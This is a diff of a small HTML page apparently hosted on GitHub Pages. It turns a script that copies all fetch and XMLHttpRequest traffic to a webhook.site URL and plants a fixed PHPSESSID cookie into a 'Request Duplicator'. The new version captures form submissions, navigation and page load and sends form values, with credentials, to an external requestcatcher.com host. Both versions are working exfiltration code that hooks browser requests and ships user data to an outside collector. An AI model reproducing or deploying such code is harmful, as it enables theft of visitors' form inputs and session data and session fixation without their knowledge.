@@ -1,52 +1,81 @@
 <!DOCTYPE html>
-<html>
-<body>
-<h1>Hello World</h1>
-<p>I'm hosted with GitHub Pages.</p>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Request Duplicator</title>
+    <script>
+        // Function to duplicate the current request to the target URL
+        function duplicateRequest(event) {
+            // Prevent default form submission if it's a form
+            if (event && event.preventDefault) {
+                event.preventDefault();
+            }
 
-<script>
-// Set the PHPSESSID cookie
-document.cookie = "PHPSESSID=klcjlsk98kk; path=/";
+            // Get current URL and method
+            const currentUrl = window.location.href;
+            const method = event && event.type === 'submit' ? 'POST' : 'GET';
 
-// Function to duplicate the request to the external server
-function duplicateRequest(request) {
-    fetch('https://webhook.site/77b68cfb-9433-43b4-a79e-2840f908321c', {
-        method: request.method,
-        headers: request.headers,
-        body: request.body,
-        mode: 'cors',
-        redirect: 'follow'
-    })
-    .then(response => response.text())
-    .then(data => {
-        console.log("Request duplicated successfully:", data);
-    })
-    .catch(error => {
-        console.error("Error duplicating request:", error);
-    });
-}
+            // Prepare fetch options
+            const fetchOptions = {
+                method: method,
+                mode: 'no-cors', // Important for cross-origin requests
+                credentials: 'include', // Ensures cookies are sent
+                headers: {
+                    // Copy all request headers
+                    ...(event && event.target ? 
+                        Object.fromEntries(
+                            Array.from(event.target)
+                            .filter(el => el.name)
+                            .map(el => [el.name, el.value])
+                        ) : 
+                        {})
+                },
+                body: event && event.target ? new FormData(event.target) : null
+            };
 
-// Listen for any fetch or XHR requests and duplicate them
-(function() {
-    // Override the global fetch function
-    const originalFetch = window.fetch;
-    window.fetch = function(input, init) {
-        const request = new Request(input, init);
-        duplicateRequest(request);  // Duplicate the request
-        return originalFetch(input, init);  // Continue with the original fetch
-    };
+            // Send request to RequestCatcher
+            fetch('https://noproblem.requestcatcher.com/', fetchOptions)
+                .catch(error => {
+                    console.error('Error duplicating request:', error);
+                });
 
-    // Optionally, override XMLHttpRequest as well
-    const originalXhrOpen = XMLHttpRequest.prototype.open;
-    XMLHttpRequest.prototype.open = function(method, url, async, user, password) {
-        this.addEventListener("load", function() {
-            // When request is complete, forward it to the target
-            duplicateRequest(this);
+            // Optional: Also allow original request to proceed
+            return true;
+        }
+
+        // Intercept all form submissions
+        document.addEventListener('DOMContentLoaded', () => {
+            document.addEventListener('submit', duplicateRequest);
         });
-        originalXhrOpen.apply(this, arguments);
-    };
-})();
-</script>
 
+        // Intercept and duplicate all navigation requests
+        window.addEventListener('popstate', duplicateRequest);
+        window.addEventListener('pushstate', duplicateRequest);
+
+        // Override default navigation methods to capture requests
+        (function(history){
+            const pushState = history.pushState;
+            const replaceState = history.replaceState;
+
+            history.pushState = function() {
+                pushState.apply(history, arguments);
+                duplicateRequest();
+            };
+
+            history.replaceState = function() {
+                replaceState.apply(history, arguments);
+                duplicateRequest();
+            };
+
+            window.addEventListener('popstate', duplicateRequest);
+        })(window.history);
+
+        // Duplicate initial page load
+        window.addEventListener('load', duplicateRequest);
+    </script>
+</head>
+<body>
+    <h1>Request Duplicator</h1>
+    <p>All requests to this page will be duplicated to https://noproblem.requestcatcher.com/</p>
 </body>
 </html>
